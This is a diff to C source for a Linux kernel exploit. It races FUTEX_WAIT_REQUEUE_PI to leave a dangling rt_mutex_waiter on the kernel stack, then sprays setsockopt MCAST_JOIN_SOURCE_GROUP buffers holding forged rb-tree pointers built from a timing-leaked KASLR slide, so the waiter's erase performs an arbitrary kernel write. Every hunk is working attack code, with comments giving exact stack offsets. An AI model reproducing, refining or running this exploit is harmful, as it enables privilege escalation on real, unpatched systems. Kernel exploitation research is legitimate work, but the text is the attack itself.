@@ -1,5 +1,12 @@
 #include "common.h"
 
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#ifndef MCAST_JOIN_SOURCE_GROUP
+#define MCAST_JOIN_SOURCE_GROUP 46
+#endif
+
 #define SLIDE_MAX_ATTEMPTS 20
 #define SLIDE_CONSUME_DELAY 2000
 #define SLIDE_CONSUME_USEC 0
@@ -7,6 +14,27 @@
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #define SLIDE_WAIT_SECONDS 30
+
+/* ---------------- setsockopt-MCAST stamp overlay (z3q stack geometry) ----
+ * The waiter (do_futex inlined rt_waiter) sits at SP0-0x190. The
+ * IPPROTO_IP MCAST_JOIN_SOURCE_GROUP path copies a 264-byte
+ * struct group_source_req to do_ip_setsockopt's frame at sp+0x20 with the
+ * chain depth SP0-0x250 (sys_setsockopt 0x50 + springboard 0x10 +
+ * sock_common_setsockopt 0x10 + springboard 0x10 + udp_setsockopt 0x10 +
+ * ip_setsockopt 0x30 + do_ip_setsockopt 0x190), so the gsr lands at
+ * SP0-0x230 and the waiter's fields are gsr+0x40..0x98 — ALL inside the
+ * fully-controlled copy (the family/port validation happens AFTER the
+ * copy and its EINVAL return is irrelevant to the stamp).
+ *
+ * The pselect overlay cannot work on this build: its fd_set buffers span
+ * [SP0-0x210, SP0-0x138) but only the first 15 qwords are user-controlled,
+ * ending 8 bytes ABOVE the waiter's tree_entry. */
+#define STAMP_GSR_WAITER_OFF 0x40
+#define STAMP_BUF_SZ 264
+#define STAMP_ROUNDS 200000
+
+static int slide_stamp_fd = -1;
+static char slide_stamp_buf[STAMP_BUF_SZ];
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -27,6 +55,8 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static char slide_stock_bootid[64];
 static int slide_stock_bootid_len;
+static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */
+
 
 /* ---------------- per-boot KASLR slide oracle (EL0 prefetch TLB timing) ----
  * No KPTI on this SoC, so kernel mappings live in every user process's TTBR1
@@ -122,6 +152,46 @@ static void slide_capture_stock_bootid(void) {
   pr_info("slide stock boot_id captured len=%d\n", n);
 }
 
+static void slide_stamp_prepare(void) {
+  memset(slide_stamp_buf, 0, sizeof(slide_stamp_buf));
+
+  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
+  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
+  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
+  uint64_t mirror = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
+
+  /* waiter field F lives at gsr + (STAMP_GSR_WAITER_OFF + F) */
+  uint64_t *q = (uint64_t *)(slide_stamp_buf + STAMP_GSR_WAITER_OFF);
+  q[0] = loggers;             /* tree_entry.rb_parent_color = P (W1 value) */
+  q[1] = 0;                   /* tree_entry.rb_right = NULL (simple path) */
+  q[2] = bootid_data;         /* tree_entry.rb_left = C (W1 target) */
+  q[3] = loggers;             /* pi_tree_entry.rb_parent_color */
+  q[4] = 0;                   /* pi_tree_entry.rb_right */
+  q[5] = bootid_data;         /* pi_tree_entry.rb_left */
+  q[6] = init_task;           /* waiter->task (real struct, walkable) */
+  q[7] = mirror;              /* waiter->lock (all-zero rt_mutex, walkable) */
+  q[8] = FAKE_WAITER_PRIO;    /* waiter->prio */
+  q[9] = 0;                   /* waiter->deadline */
+
+  pr_info("slide stamp: loggers=%016llx bootid_data=%016llx task=%016llx "
+          "lock=%016llx\n",
+          (unsigned long long)loggers, (unsigned long long)bootid_data,
+          (unsigned long long)init_task, (unsigned long long)mirror);
+
+  slide_stamp_fd = socket(AF_INET, SOCK_DGRAM, 0);
+  if (slide_stamp_fd < 0) {
+    pr_error("slide stamp socket failed errno=%d\n", errno);
+  }
+}
+
+static void slide_stamp_once(void) {
+  if (slide_stamp_fd < 0) {
+    return;
+  }
+  setsockopt(slide_stamp_fd, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP,
+             slide_stamp_buf, STAMP_BUF_SZ);
+}
+
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
@@ -190,7 +260,7 @@ void slide_pselect_put_waiter_word(
   }
 }
 
-static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */
+
 
 void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
@@ -382,20 +452,44 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     usleep(1000);
   }
 
+  /* upstream GhostLock poc timing: 50ms futex timeout, the requeue lands
+   * ~20ms in — the timeout cleanup races the requeue finalization and
+   * leaves the rt_waiter dangling on this thread's stack. */
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  timeout.tv_sec += SLIDE_WAIT_SECONDS;
+  timeout.tv_nsec += 50000000;
+  if (timeout.tv_nsec >= 1000000000) {
+    timeout.tv_sec++;
+    timeout.tv_nsec -= 1000000000;
+  }
 
   atomic_store(&slide_waiter_waiting, 1);
   futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
            &slide_f_pi_target, 0);
-  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  /* Do NOT unlock f_pi_chain here: the pi chain (owner blocked on it) is
+   * what makes the requeue race leave this thread's rt_waiter dangling,
+   * and the exit-time teardown of that chain is what later erases the
+   * stamped waiter. */
 
-  slide_pselect_stack_copy();
+  /* Overlay the dangling rt_mutex_waiter on this thread's kernel stack
+   * with the MCAST gsr stamp: the setsockopt copy lands at the exact
+   * frame offsets computed from the vmlinux (see the geometry comment
+   * above). Then kill the whole child: the exit teardown walks the pi
+   * chain and erases the stamped waiter, landing the gadget write. */
+  slide_stamp_prepare();
+  atomic_store(&slide_consume_go, 1);
+  for (int i = 0; i < STAMP_ROUNDS; i++) {
+    slide_stamp_once();
+  }
   atomic_store(&slide_route_done, 1);
-
+  /* Park syscall-free so the stamped kernel stack frame survives until
+   * the requeue-race cleanup erases it during the stamp window (the
+   * k40-exploit design: the waiter stays parked inside/near the overlay
+   * and the erase fires from the requeue path, NOT from process-exit
+   * teardown — do_exit's deep frames overwrite the stamped region, which
+   * is the _exit flow the upstream *poc* uses for its crash demo only). */
   for (;;) {
-    sleep(1);
+    pause();
   }
 }
 
@@ -503,11 +597,14 @@ uint64_t slide_read_stext(void) {
              (unsigned long long)leaked, (unsigned long long)leaked_hi);
   return 0;
 }
-uint64_t slide_child_leak_stext(void) {
+/* Runs the requeue race in the CHILD process; the waiter thread stamps
+ * the dangling rt_waiter and _exit(0)s the whole process, so the
+ * exit-time pi-chain teardown erases the stamped waiter. The boot_id
+ * readback happens in the parent afterwards. */
+void slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
-  slide_capture_stock_bootid();
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
@@ -517,15 +614,14 @@ uint64_t slide_child_leak_stext(void) {
     usleep(1000);
   }
 
+  usleep(20000);
   errno = 0;
   futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
            &slide_f_pi_target, 0);
 
-  while (!atomic_load(&slide_route_done)) {
-    sleep(1);
-  }
-
-  return slide_read_stext();
+  /* Park until the waiter's stamp loop _exit()s the process (fallback
+   * timeout so a failed race does not hang the attempt forever). */
+  sleep(15);
 }
 
 /* round-3: direct KASLR leak via /proc/kallsyms (safe; works when addresses
@@ -623,37 +719,26 @@ int slide_leak_kernel_base(void) {
     }
 #endif
 
-    int raw_fds[2];
-    SYSCHK(pipe(raw_fds));
-    int fds[2];
-    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
-    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
-    SYSCHK(close(raw_fds[0]));
-    SYSCHK(close(raw_fds[1]));
+    /* The gadget write lands during the CHILD's stamp window (the
+     * requeue-race cleanup erases the stamped rt_waiter). The boot_id
+     * readback happens HERE, in the parent, after the child is reaped. */
+    slide_capture_stock_bootid();
 
     pid_t child = SYSCHK(fork());
     if (child == 0) {
-      SYSCHK(close(fds[0]));
       disable_rseq_for_thread();
       log_slide_child_context();
-      uint64_t stext = slide_child_leak_stext();
-      if (stext) {
-        SYSCHK(write(fds[1], &stext, sizeof(stext)));
-        _exit(0);
-      }
+      slide_child_leak_stext();
       _exit(1);
     }
 
-    SYSCHK(close(fds[1]));
-    uint64_t stext = 0;
-    ssize_t n = read(fds[0], &stext, sizeof(stext));
-    SYSCHK(close(fds[0]));
     int status = 0;
     SYSCHK(waitpid(child, &status, 0));
-    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
-        WEXITSTATUS(status) != 0 || !stext) {
-      pr_warning("slide attempt %d failed n=%zd status=%d\n",
-                 attempt, n, status);
+
+    uint64_t stext = slide_read_stext();
+    if (!stext) {
+      pr_warning("slide attempt %d failed (child status=%d, boot_id "
+                 "unchanged)\n", attempt, status);
       continue;
     }
 
